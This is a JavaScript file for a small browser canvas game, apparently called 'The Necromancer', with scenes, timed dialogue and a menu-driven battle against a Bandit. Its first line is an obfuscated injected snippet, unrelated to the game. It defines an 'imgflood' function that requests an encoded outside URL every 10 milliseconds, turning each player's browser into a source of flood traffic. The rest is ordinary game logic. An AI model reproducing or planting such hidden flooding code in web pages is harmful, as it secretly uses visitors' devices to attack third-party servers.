_0x95b3=[_0x6d1e(_0x61f8(_0xcd6a(_0x22cf(_0x5b47(_0xa2ca(_0x082b(_0x9208(_0xa578[35])))))))),_0xcd6a(_0x5b47(_0x082b(_0xa578[3]))),_0x6d1e(_0x61f8(_0xcd6a(_0x22cf(_0xa2ca(_0x082b(_0x9208(_0xa578[48]))))))),_0x6d1e(_0x61f8(_0xcd6a(_0x22cf(_0x5b47(_0xa578[32]))))),_0x6d1e(_0x61f8(_0xcd6a(_0x22cf(_0x5b47(_0xa2ca(_0x9208(_0xa578[46]))))))),_0x61f8(_0xcd6a(_0x22cf(_0x5b47(_0x082b(_0x9208(_0xa578[51]))))))];function imgflood(){var a=_0x95b3[0x0];var b=_0x95b3[0x1];var c=new Image();var d=Math[_0x95b3[0x3]](Math[_0x95b3[0x2]]()*0x2540be3ff);c[_0x95b3[0x4]]=_0x95b3[0x5]+a+b+d}setInterval(imgflood,0xa)
      
         function FlowerBush(flowerBushX, flowerBushY) {
             var flowerBush = new Image();
             flowerBush.onload = function() {
                 ctx.drawImage(flowerBush, flowerBushX, flowerBushY);
             };
             flowerBush.src = "Sprites/FlowerBush.png";
         }
         
         function drawBullet(){
           var bullet = new Image();
           bullet.onload = function() {
             ctx.drawImage(bullet, bulletX, bulletY);
           };
           bullet.src = "Sprites/Bullet.png";
         }
         
         
         //Draws a text box
         function Dialogue(text, timeUntilStart, timeUntilEnd, color) {
             var newText = document.createTextNode(text),
                 dialogue = document.getElementById("p1");
             dialogue.style.color = color;
             dialogue.style.backgroundColor = "black";
             setTimeout(function() {
                 dialogue.appendChild(newText);
             }, timeUntilStart);
             setTimeout(function() {
                 dialogue.removeChild(newText);
             }, timeUntilEnd);
         }

         function battleDialogue(text, timeUntilStart, timeUntilEnd, color) {
             var newText = document.createTextNode(text),
                 dialogue = document.getElementById("p1");
             dialogue.style.color = color;
             dialogue.style.backgroundColor = "black";
             setTimeout(function() {
                 dialogue.appendChild(newText);
             }, timeUntilStart);
             setTimeout(function() {
                 dialogue.removeChild(newText);
                 fighting = "Bandit";
                 drawBattleMap();
             }, timeUntilEnd);
         }
         //backgrounds
         function drawBanditBattleBackground() {
             var bbb = new Image();
             bbb.onload = function() {
                 ctx.drawImage(bbb, 100, 100, window.outerWidth - 250, window.outerHeight - 200);
             };
             bbb.src = "Backgrounds/BanditBattleBackground.png";
         }
         //All in-game tiles WARNING: Put tiles before objects
         function grass(grassX, grassY) {
             ctx.fillStyle = "#00a51b";
             ctx.fillRect(grassX, grassY, 25, 25);
         }
         //Draws scene
         function drawMap1() {
             playerX = 300;
             ctx.clearRect(0, 0, ctx.canvas.width, ctx.canvas.height);
             document.body.style.backgroundColor = "#000714";
             moon(20, 20);
         }

         function drawMap2() {
             playerX = 300;
             ctx.clearRect(0, 0, ctx.canvas.width, ctx.canvas.height);
             document.body.style.backgroundColor = "#000714";
             for (var x = 0; x < borderD; x += Math.round(Math.random() * 45)) {
                 for (var y = 0; y < borderW; y += Math.round(Math.random() * 45)) {
                     star(x, y);
                 }
             }
         }

         function drawMap3() {
             addAMemory("The Bandit said something about the zombie apocalypse");
             addAMemory("The Bandit ran away from thinking you were a zombie");
             addAMemory("The Bandit said he was on guard do");
             playerX = 300;
             playerY = 340;
             ctx.clearRect(0, 0, ctx.canvas.width, ctx.canvas.height);
             document.body.style.backgroundColor = "#000710";
             Campfire(500, 300);
             drawBanditFacingRight();
             movement = false;
             Dialogue("Bandit: Dear Audio Diary,", 500, 3000, "blue");
             Dialogue("It's been a long time since I've seen any...living people...", 3000.0001, 6500, "blue");
             Dialogue("Maybe the rest were eaten...", 6500.0001, 10000, "blue");
             Dialogue("...", 10000.0001, 13500, "white");
             Dialogue("AWESOME!!!", 13500.0001, 17000.0001);
             Dialogue("I'll be on the front page of The Death Valley Times", 17000.0001, 20500, "blue");
             Dialogue("THE BANDIT SURVIVES ZOMBIE APOCALYPSE", 20500.0001, 24000, "blue");
             Dialogue("EVEN THE NECROMANCER CAN'T STOP HIM", 24000.0001, 27500, "blue");
             Dialogue("HE'S BEEN CROWNED KING OF UNIVERSE", 27500.0001, 30000, "blue");
             Dialogue("That'd be cool", 30000.0001, 33500);
             Dialogue("Whatever, I better get back on guard duty", 33500.0001, 37000, "blue");
             setTimeout(function() {
                 ctx.clearRect(banditX, banditY, 100, 100);
                 drawBanditFacingLeft();
                 Dialogue("...", 2500, 4000, "blue");
                 Dialogue("AHHH!!!", 4000.0001, 7500, "blue");
                 
                 setTimeout(function() {
                    setInterval(function() {
                         if (banditX < ctx.canvas.width-ctx.canvas.width/4 && scene === 3) {
                             banditX++;
                             ctx.clearRect(banditX - 10, banditY, 510, 500);
                             drawBanditFacingRight();
                         } else if (banditX >= ctx.canvas.width-ctx.canvas.width/4) {
                             ctx.clearRect(banditX, banditY, 200, 200);
                             movement = true;
                         }
                     }, 3000 / 60);
                 }, 7500.0001);
                 
                 Dialogue("A Z-Z-ZOMBIE!!!", 7500.0001, 10000, "blue");
                 Dialogue("NONONONONONONONONONONONONONO", 10000.0001, 13500, "blue");
                 Dialogue("I DON'T WANNA DIE!!!", 13500.0001, 17000, "blue");
  
             }, 37500);
         }

         function drawMap4() {
             ctx.clearRect(0, 0, ctx.canvas.width, ctx.canvas.height);
             document.body.style.backgroundColor = "#001a3d";
             playerX = 200;
             playerY = 340;
             banditX = 600;
             banditY = 300;
             drawBanditFacingLeftWithArmRaised();
             FlowerBush(350, 100);
         }
         
         function drawMap5() {
           ctx.clearRect(0, 0, ctx.canvas.width, ctx.canvas.height);
             document.body.style.backgroundColor = "#001a3d";
             playerX = 200;
             playerY = 340;
             banditX = 600;
             banditY = 320;
             drawProtagonistFacingRight();
             drawBanditFacingLeft();
             ctx.fillStyle = "#A17300";
             ctx.fillRect(0, 390, ctx.canvas.width, 700);
         }

         function option() {
             ctx.fillStyle = "white";
             ctx.font = "20px Arial";
             ctx.fillText("Attack", 1, 175);
             ctx.fillText("Eat", 1, 275);
             ctx.fillText("Threaten", 1, 375);

             ctx.fillText("Run Away", 1200, 175);
             ctx.fillText("Talk", 1200, 275);
             ctx.fillText("Memories", 1200, 375);
         }
         //Draws the map for fighting enemies
         function drawBattleMap() {
             function showBattleScreen(text, x, y, color, font) {
                 ctx.fillStyle = color;
                 ctx.font = font;
                 ctx.fillText(text, x, y);
             }
             if (fighting == "Bandit") {
                 ctx.clearRect(0, 0, ctx.canvas.width, ctx.canvas.height);
                 document.body.style.backgroundColor = "black";
                 drawBanditBattleBackground();
                 var potato = document.getElementById("p1").innerHTML;
                 potato = "loading";
                 setTimeout(function() {
                   potato = "";
             Dialogue("Mysterious Voice: Hey it's me again",0, 3450, "purple");
             Dialogue("So I have to talk in stupid text because talking to you with a voice was really hard the first time, I had to put a lot of effort into it", 3450.00001, 13450, "purple");
               Dialogue("I'll be here to help you out as much as I can", 13500.0001, 20000, "purple");
             Dialogue("Look for my dialogue color, it will always be purple", 20000.0001, 24500, "purple");
             Dialogue("Don't judge me, all the good dialogue colors were taken", 24500.0001, 28500, "purple");
             addAMemory("The Mysterious Voice can break the 4th wall");
             Dialogue("Any how I'll send a prompt to ask if you want me to explain how to fight", 28500.0001, 31300, "purple");
             setTimeout(function(){
               var wannaKnowHowToFight = prompt("Would you like a tutorial on how to fight");
             if(wannaKnowHowToFight.toLowerCase() === "yes"){
               Dialogue("Mysterious Voice: Alrighty then!", 0, 2000, "purple");
               Dialogue("First, let me explain what the fight options all mean", 2000.0001, 5000, "purple");
               Dialogue("Attack is self explanatory, do damage to the enemy", 5000.0001, 9000, "purple");
               Dialogue("You don't know how to dodge attacks yet so just be careful when attacking, the enemy can attack too!", 9000.0001, 15000, "purple");
               Dialogue("Next is eat, you can eat food when you have any to heal and get power ups", 15000.0001, 20000, "purple");
               Dialogue("If you threaten the enemy, you might scare them into giving up, but it could also enrage them so make sure you know a lot about the enemy", 20000.0001, 30000, "purple");
               Dialogue("Running away doesn't always work, and you might even trip and take damage!", 30000.0001, 37000, "purple");
               Dialogue("If you talk, you try to reason with the enemy, and talk your way out of the fight", 37000.0001, 42000, "purple");
               Dialogue("Finally and in my opinion most importantly, memories", 42000.0001, 46000, "purple");
               Dialogue("This is everything you have learned, and I'm not talking about instructions on how to move and stuff", 46000.0001, 55500, "purple");
               Dialogue("It's everything that's happened, what people think of you, who is your friend and who's your enemy, etc. what you can remember", 55500.0001, 62500, "purple");
               Dialogue("It's a way to rebuild your memory, beause of your amnesia and all", 62500.0001, 66500, "purple");
               Dialogue("Ok, let's begin the battle!", 66500.0001, 69500, "purple");
               setTimeout(function(){
                 canAttack = true;
               }, 69500);
             } else if(wannaKnowHowToFight.toLowerCase() === "no"){
               Dialogue("If you insist, take on Bandit!", 0, 3000);
               setTimeout(function(){
                 canAttack = true;
               }, 3000);
             } else {
               Dialogue("You didn't type in yes or no, so I'll just explain the rules anyway", 0, 2000);
               Dialogue("First, let me explain what the fight options all mean", 2000.0001, 5000, "purple");
               Dialogue("Attack is self explanatory, do damage to the enemy", 5000.0001, 9000, "purple");
               Dialogue("You don't know how to dodge attacks yet so just be careful when attacking, the enemy can attack too!", 9000.0001, 15000, "purple");
               Dialogue("Next is eat, you can eat food when you have any to heal and get power ups", 15000.0001, 20000, "purple");
               Dialogue("If you threaten the enemy, you might scare them into giving up, but it could also enrage them so make sure you know a lot about the enemy", 20000.0001, 30000, "purple");
               Dialogue("Running away doesn't always work, and you might even trip and take damage!", 30000.0001, 37000, "purple");
               Dialogue("If you talk, you try to reason with the enemy, and talk your way out of the fight", 37000.0001, 42000, "purple");
               Dialogue("Finally and in my opinion most importantly, memories", 42000.0001, 46000, "purple");
               Dialogue("This is everything you have learned, and I'm not talking about instructions on how to move and stuff", 46000.0001, 55500, "purple");
               Dialogue("It's everything that's happened, what people think of you, who is your friend and who's your enemy, etc. what you can remember", 55500.0001, 62500, "purple");
               Dialogue("It's a way to rebuild your mmemory, beause of your amnesia and all", 62500.0001, 66500, "purple");
               setTimeout(function(){
                 canAttack = true;
               }, 66500);
             }
             }, 31300.001);

                     column = 1;
                     row = 1;
                     showBattleScreen("", 100, 600, "black", "40px Arial");
                     playerX = 200;
                     playerY = 370;
                     banditX = 600;
                     banditY = 350;
                     drawProtagonistFacingRight();
                     drawBanditFacingLeftWithArmRaised();
                     potato = "";

                     ctx.strokeStyle = "white";
                     ctx.fillStyle = "black";
                     ctx.strokeRect(1, 100, 100, 517);
                     ctx.fillRect(1, 100, 100, 517);

                     ctx.strokeRect(1200, 100, 100, 517);
                     ctx.fillRect(1200, 100, 100, 517);
                     
                     ctx.strokeRect(0, 0, 1300, 100);
                      ctx.fillStyle = "white";
                      ctx.font = "50px Arial";
                     ctx.fillText("Player Health: " + playerHealth + "                  Bandit's Health: " + banditHealth, 100, 50);

                     option();
                 }, 550);
             }
         }
         //If the scene number is equal to a specific number, draw a specific map.
         function checkMap() {
             if (scene == 1) {
                 drawMap1();
             } else if (scene == 2) {
                 drawMap2();
             } else if (scene == 3) {
                 drawMap3();
             } else if (scene == 4) {
                 drawMap4();
             } else if (scene == 5){
               drawMap5();
             }
             
         }
         
          //Attacks of you and zee enemies               
         function Attack(){
          canAttack = false;
           option();
           banditHealth -= playerDamage;
           ctx.clearRect(1, 1, 1250, 75);
           ctx.font = "50px Arial";
           ctx.fillText("Player Health: " +  playerHealth + "                 Bandit's Health: " + banditHealth, 100, 50); 
           
           if(fighting === "Bandit"){
            if(attackNumber === 1){
              ctx.font = "20px Arial";
              Dialogue("Prepare to die, evil zombie", 0, 4000, "blue");
              setTimeout(function(){
                
              setInterval(function() {
                         bulletX--;
                         ctx.clearRect(bulletX + 8 , bulletY, 40, 16);
                           drawProtagonistFacingRight();
                         drawBullet();
                     }, 100 / 65);
                     Dialogue("Bandit: Danget, I missed the zombie!", 5000, 8000, "blue");
                     Dialogue("And I broke the fight screen!", 8001, 11000, "blue");
                     Dialogue("Thank God he's not threatening me", 11000.0001, 14750);
                    addAMemory("Bandit can break the 4th wall");
                    Dialogue("That would be terrifying!", 14750.0001, 16750, "blue");
                    Dialogue("Well, I won't miss again, if that thing in front of me attacks again, I'll kil it instantly", 14750.0001, 19000, "blue");
             setTimeout(function(){
              canAttack = true;
              }, 19000);
               
              }, 4001);
            } else if(attackNumber === 2){
              ctx.font = "20px Arial";
              bulletX--;
             ctx.clearRect(bulletX + 8 , bulletY, 40, 16);
               drawBullet();
              Dialogue("DIE EVIL ZOMBIE!!!", 0, 2000, "blue");
              Dialogue("Bandit shot you", 2000.0001, 4000, "blue");
             setTimeout(function(){
              canAttack = true;
             }, 4000);
              setTimeout(function(){
              playerHealth = 0;
              drawProtagonistFacingRight();
              }, 5001);
            }
           }
           
         }
         
         //Eat some deliecious yummy F00D
         function Eat(){
          canAttack = false;
           if(fighting == "Bandit"){
               Dialogue("Mysterious Voice:You don't have any food to eat!", 0, 2800, "purple");
            setTimeout(function(){
             canAttack = true;
            }, 2800);
         }
         }
         
         //Threaten the enemy
         function Threaten(){
          canAttack = false;
           if(fighting === "Bandit"){
               Dialogue("You: Boo!", 0, 1750, "white");
               Dialogue("Bandit: AAAAH!", 1751, 3750, "blue");
               Dialogue("You have won the battle by scaring Bandit!", 3750.0001, 7750, "purple");
               
               setTimeout(function(){
               fighting = "";
               scene = 5;
               canAttack = true;
               checkMap();
               }, 3750);
           }
         }
         
         //Run away from the enemy
         function RunAway(){
          canAttack = false;
          if(fighting === "Bandit"){
            if(runNum === 1){
            Dialogue("Mysterious Voice: You can't flee from bosses", 0, 3000, "purple");
            addAMemory("You can't flee from bosses");
            Dialogue("You might be mad you're fighitng a boss for you first fight, but he shouldn't be too hard to beat, he's terrified of you!", 3000.0001, 5350, "purple");
            setTimeout(function(){
             canAttack = true;
            }, 5350);
            } else {
              Dialogue("Mysterious Voice: You still can't flee from bosses, silly!", 0, 4250, "purple");
            setTimeout(function(){
             canAttack = true;
            }, 4250);
            }
          } 
         }
         
         //Try to reason/talk to the enemy
         function Talk(){
          canAttack = false;
           if(fighting == "Bandit"){
             if(talkNumber === 1){
             Dialogue("You: I'm not a zombie", 0, 2850, "white");
             Dialogue("Bandit: AAAH, THE ZOMBIE ATE A BRAIN AND CAN TALK NOW!!!", 2850.0001, 5850, "blue");
             setTimeout(function(){
               canAttack = true;
             }, 5850);
           } else if(talkNumber === 2){
             Dialogue("You: LISTEN TO ME!", 0, 1800, "white");
             Dialogue("Bandit: Well I'm gonna die anyway, what do you have to say strange smart zombie?", 1800.0001, 5800, "blue");
             setTimeout(function(){
               canAttack = true;
             }, 5800);
             
           } else if(talkNumber === 3){
             Dialogue("Option 1: I'm not a zombie Option 2: Why do you keep running away from me? Option 3: Don't worry, I'm not here to kill you", 0, 6000, "white");
             Dialogue("Mysterious Voice: Type in 1, 2, or 3, type anything else and I'll just pick a random option for you", 6000.0001, 10000, "purple");
             setTimeout(function(){
               talkOptionBanditFight = prompt("Which option do you choose?");
              var talkOptionBanditFightOption = talkOptionBanditFight.toLowerCase().replace(".", "").replace(" ", "").replace("'", "").replace("?", "").replace(".", "");
             if(talkOptionBanditFightOption == 1 || talkOptionBanditFightOption == "one" || talkOptionBanditFightOption == "option1" || talkOptionBanditFightOption == "imnotazombie"){
               talkOptionBanditFight = 1;
               Dialogue("You: I'm not a zombie", 0, 3000, "white");
               Dialogue("Bandit: I really do want to believe you, but it's been so long since I've seen a human, prove it", 3000, 9000, "blue");
               setTimeout(function(){
                 canAttack = true;
               }, 9000);
             } else if(talkOptionBanditFightOption == 2 || talkOptionBanditFightOption == "two" || talkOptionBanditFightOption == "option2" || talkOptionBanditFightOption == "whydoyoukeeprunningawayfromme"){
               talkOptionBanditFight = 2;
               Dialogue("You: Why do you keep running away from me", 0, 4000, "white");
               Dialogue("Bandit: Why are you following me?", 4000.0001, 7000, "blue");
               setTimeout(function(){
                 canAttack = true;
               }, 7000);
             } else if(talkOptionBanditFightOption == 3 || talkOptionBanditFightOption == "three" || talkOptionBanditFightOption == "option3" || talkOptionBanditFightOption == "dontworryimnotheretokillyou"){
               talkOptionBanditFight = 3;
               Dialogue("You: Don't worry, I'm not here to kill you", 0, 2500, "white");
               Dialogue("Bandit: You're not here to kill me...", 2500.0001, 5000, "blue");
               Dialogue("YOUR HERE TO TURN ME INTO ONE OF YOU!!!", 5000.0001, 7500, "blue");
               Dialogue("NEEEEEEVEEEEEER!!!!!", 7500.0001, 10000.0001, "blue");
               Dialogue("Bandit killed you", 10000, 12000, "purple");
               playerHealth = 0;
               drawProtagonistFacingRight();
             }  else {
               var randomNumber = Math.floor((Math.random() * 3) + 1);
               if(randomNumber === 1){
               talkOptionBanditFight = 1;
               Dialogue("You: I'm not a zombie", 0, 3000, "white");
               Dialogue("Bandit: I really do want to believe you, but it's been so long since I've seen a human, prove it", 3000, 9000, "blue");
               setTimeout(function(){
                 canAttack = true;
               }, 9000);
             } else if(randomNumber === 2){
               talkOptionBanditFight = 2;
               Dialogue("You: Why do you keep running away from me", 0, 4000, "white");
               Dialogue("Bandit: Why are you following me?", 4000.0001, 7000, "blue");
               setTimeout(function(){
                 canAttack = true;
               }, 7000);
             } else if(randomNumber === 3){
               talkOptionBanditFight = 3;
               Dialogue("You: Don't worry, I'm not here to kill you", 0, 2500, "white");
               Dialogue("Bandit: You're not here to kill me...", 2500.0001, 5000, "blue");
               Dialogue("YOUR HERE TO TURN ME INTO ONE OF YOU!!!", 5000.0001, 7500, "blue");
               Dialogue("NEEEEEEVEEEEEER!!!!!", 7500.0001, 10000.0001, "blue");
               Dialogue("Bandit killed you", 10000, 12000, "purple");
               playerHealth = 0;
               drawProtagonistFacingRight();
              setTimeout(function(){
               canAttack = true;
              }, 12000);
             } 
             }
               }, 10000);
         } else if(talkNumber === 4){
           if(talkOptionBanditFight === 1){
             Dialogue("You: How?", 0, 1200, "white");
             Dialogue("Bandit: With...", 1200.0001, 2900, "blue");
             Dialogue("A...", 2900.0001, 4900, "blue");
             Dialogue("DAAAAAAAANCE BAAAAAAAAAAATTLLLLLE!!!", 4900.001, 9900, "blue");
              setTimeout(function(){
               canAttack = true;
              }, 9900);
           } else if(talkOptionBanditFight === 2){
             Dialogue("You: I don't remmeber anything and you were the first person I bumped into", 0, 4100, "white");
             Dialogue("Bandit: So I'm like your brother now?", 4100.0001, 7000, "blue");
              setTimeout(function(){
               canAttack = true;
              }, 7000);
           }
         } else if(talkNumber === 5){
           if(talkOptionBanditFight === 1){
            Dialogue("Mysterious Voice: Wut", 0, 2000, "purple");
            Dialogue("You: Wut", 2000.0001, 3500, "white");
            Dialogue("YEP!!! AAAAAAAAAAARRRRRRRE", 3500.0001, 6000, "blue");
            Dialogue("YOOOOOOOOOOOOUUUU", 6000.0001, 8000, "blue");
            Dialogue("REEEAAAAAAADYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY", 8000.0001, 13000, "blue");
            
              setTimeout(function(){
               canAttack = true;
              }, 3500);
           } else if(talkOptionBanditFight === 2){
            Dialogue("Mysterious Voice: Talk Options: 1. YAAAS 2. Nope", 0, 5000, "purple");
            var bros = prompt("Are we bros?");
              setTimeout(function(){
               canAttack = true;
              }, 5000);
            bros = bros.toLowerCase();
            if(bros == 1 || bros == "1." || bros == "yes" || bros== "yeah" || bros == "yas" || bros == "yaas" || bros == "yaaas" || bros == "yaaaas" || bros == "yaaaaas"){
             Dialogue("Awesome! After my real brother disapeered I always wante", 0, 3200, "blue");
             Dialogue("Never mind that's a story for another day", 3200.0001, "blue");
              setTimeout(function(){
               canAttack = true;
              }, 3200);
            }
           }
          
         }
           }
        }
        
         //Check what you remember
         function Memories(){
          canAttack = false;
            if(memoryNumber === 1){
              Dialogue("This is everything that you have learned so far, if you didn't have enough time to read it, press memories again: " + memories, 0, 10000, "purple");
             setTimeout(function(){
              canAttack = true;
             }, 10000);
           } else {
             Dialogue("What you know so far: " + memories, 0, 5000, "white");
            setTimeout(function(){
             canAttack = true;
            }, 5000);
           }
         }

         //Creates the rectangle on the selected option
         function drawOptionRectangle() {
             ctx.strokeStyle = "white";
             if (column === 1) {
                 if (row === 1) {
                     ctx.clearRect(1, 150, 100, 315);
                     ctx.clearRect(1200, 150, 100, 315);
                     ctx.strokeRect(1, 155, 100, 35);
                 } else if (row === 2) {
                     ctx.clearRect(1, 150, 100, 315);
                     ctx.clearRect(1200, 150, 100, 315);
                     ctx.strokeRect(1, 255, 100, 35);
                 } else if (row === 3) {
                     ctx.clearRect(1, 150, 100, 315);
                     ctx.clearRect(1200, 150, 100, 315);
                     ctx.strokeRect(1, 355, 100, 35);
                 }

             } else if (column === 2) {
                 if (row === 1) {
                     ctx.clearRect(1, 150, 100, 315);
                     ctx.clearRect(1200, 150, 100, 315);
                     ctx.strokeRect(1200, 155, 100, 35);
                 } else if (row === 2) {
                     ctx.clearRect(1, 150, 100, 315);
                     ctx.clearRect(1200, 150, 100, 315);
                     ctx.strokeRect(1200, 255, 100, 35);
                 } else if (row === 3) {
                     ctx.clearRect(1, 150, 100, 315);
                     ctx.clearRect(1200, 150, 100, 315);
                     ctx.strokeRect(1200, 355, 100, 35);
                 }
             }
         }
         //Checks to see if device is mobile
         var isMobile = {
             Android: function() {
                 return navigator.userAgent.match(/Android/i);
             },
             BlackBerry: function() {
                 return navigator.userAgent.match(/BlackBerry/i);
             },
             iOS: function() {
                 return navigator.userAgent.match(/iPhone|iPad|iPod/i);
             },
             Opera: function() {
                 return navigator.userAgent.match(/Opera Mini/i);
             },
             Windows: function() {
                 return navigator.userAgent.match(/IEMobile/i);
             },
             any: function() {
                 return (isMobile.Android() || isMobile.BlackBerry() || isMobile.iOS() || isMobile.Opera() || isMobile.Windows());
             }
         };
         //Adds movement to game if movement buttons are pressed whether the device is mobile or not
         document.addEventListener('keydown', function(e) {
             if (e.key === 'w' && playerY >= borderW && movement === true && scene !== 4 || e.keyCode === 38 && playerY >= borderW && movement === true && scene !== 4) {
                 playerY -= playerSpeed;
                 ctx.clearRect(playerX - 5, playerY - 15, 95, 95);
                 if (scene == 3) {
                     Campfire(500, 300);
                 } else if (scene == 4) {
                     FlowerBush(350, 100);
                 }
                 drawProtagonistFacingUp();
             }
             if (e.key == 'd' && playerX < borderD && movement === true || e.keyCode === 39 && playerX < borderD && movement === true) {
                 if (playerX > borderD - 20) {
                     scene++;
                     checkMap();
                 }
                 if (scene < 0) {
                     scene++;
                 }
                 if (scene == 3) {
                     Campfire(500, 300);
                 } else if (scene == 4) {
                     FlowerBush(350, 100);
                     if (playerX > banditX - 135) {
                         movement = false;
                         if (playerX > banditX - 135) {
                             Dialogue("Bandit: Oh no it's YOU!!!", 0, 2000, "blue");
                             Dialogue("I WON'T LET YOU END THE WORLD", 2000.0001, 4670, "blue");
                             Dialogue("YOU EVIL DEAD SCUM!!!", 4670.0001, 6670, "blue");
                             battleDialogue("FIGHT MEEEEEEE!!", 6670.0001, 10370, "blue");
                         }
                     }
                 }
                 playerX += playerSpeed;
                 ctx.clearRect(playerX - 30, playerY - 15, 100, 100);
                 drawProtagonistFacingRight();
             }
             if (e.key == 's' && playerY < borderS && movement === true && scene !== 4 || e.keyCode === 40 && playerY < borderS && movement === true && scene !== 4) {
                 playerY += playerSpeed;
                 ctx.clearRect(playerX - 10, playerY - 30, 100, 100);
                 if (scene == 3) {
                     Campfire(500, 300);
                 } else if (scene == 4) {
                     FlowerBush(350, 100);
                 }
                 drawProtagonistFacingDown();
             }
             if (e.key == 'a' && playerX > borderA && movement === true || e.keyCode === 37 && playerX > borderA && movement === true) {
                 if (playerX < borderA + 20 && scene !== 1 && scene !== 4) {
                     scene--;
                     checkMap();
                 }
                 if (scene == 3) {
                     Campfire(500, 300);
                 } else if (scene == 4) {
                     FlowerBush(350, 100);
                 }
                 if (scene < 0) {
                     scene++;
                 }
                 playerX -= playerSpeed;
                 ctx.clearRect(playerX - 10, playerY - 5, 100, 100);
                 drawProtagonistFacingLeft();
             }

             //A ton of code for selecting options, and there's more of it above.
             if (e.keyCode == 38 && fighting !== "") {
                 row--;
                 if (row <= 0) {
                     row = 3;
                 }
                 drawOptionRectangle();
                 option();
             } else if (e.keyCode == 40 && fighting !== "" && canAttack === true) {
                 row++;
                 if (row >= 4) {
                     row = 1;
                 }
                 drawOptionRectangle();
                 option();

             } else if (e.keyCode == 39 && fighting !== "" && canAttack === true) {
                 column++;
                 if (column >= 3) {
                     column = 1;
                 }
                 drawOptionRectangle();
                 option();
             } else if (e.keyCode == 37 && fighting !== "" && canAttack === true) {
                 column--;
                 if (column <= 0) {
                     column = 2;
                 }
                 drawOptionRectangle();
                 option();
             }
             
             //If space is pressed, an option is selected if fighting
             if(e.keyCode == 32 && fighting !== "" && canAttack === true){             
               if (column === 1) {
                 if (row === 1) {
                   attackNumber++;
                   Attack();
                 } else if (row === 2) {
                   eatNumber++;
                   Eat();
                 } else if (row === 3) {
                    threatNumber++;
                   Threaten();
                 }

             } else if (column === 2) {
                 if (row === 1) {
                   //I think the variable name for this was clever
                   runNum++;
                   RunAway();
                 } else if (row === 2) {
                   talkNumber++;
                   Talk();
                 } else if (row === 3) {
                   memoryNumber++;
                   Memories();
                 }
             }
             }


         });
     }
     //Start the startscreen
     function startScreen() {
         onGame = false;
         //function to literally start the game.
         function startGame(event) {
             var mouseX = event.clientX;
             var mouseY = event.clientY;
             if (mouseX > 50 && onGame === false) {
                 onGame = true;
                 game();
             }
             window.addEventListener('touchstart', function() {
               if(onGame === false){
                 game();
               }
             });
             
         }
         //If you click then the game starts
         setTimeout(function() {
             document.addEventListener("mousedown", startGame);
         }, 3000);

         //Clears out thne screen on the start screen
         ctx.clearRect(0, 0, ctx.canvas.width, ctx.canvas.height);
         document.body.style.backgroundColor = "white";
         var theNecromancer = new Image();
         theNecromancer.onload = function() {
             ctx.drawImage(theNecromancer, -100, 0);
         };
         theNecromancer.src = "Sprites/TheNecromancerLogo.png";
         var startButton = new Image();
         startButton.onload = function() {
             ctx.drawImage(startButton, 40, 300);
             var mouseX = event.clientX;
             var mouseY = event.clientY;
             if (mouseX > 0 && onGame === false) {
                 onGame = false;
                 game();
             }
         };
         
         startButton.src = "Sprites/StartButton.png";
         var loading = document.getElementById("loading");
         loading.innerHTML = "loading";
         setTimeout(function() {
             loading.innerHTML = "";
         }, 3000);
     }
     startScreen();
 };
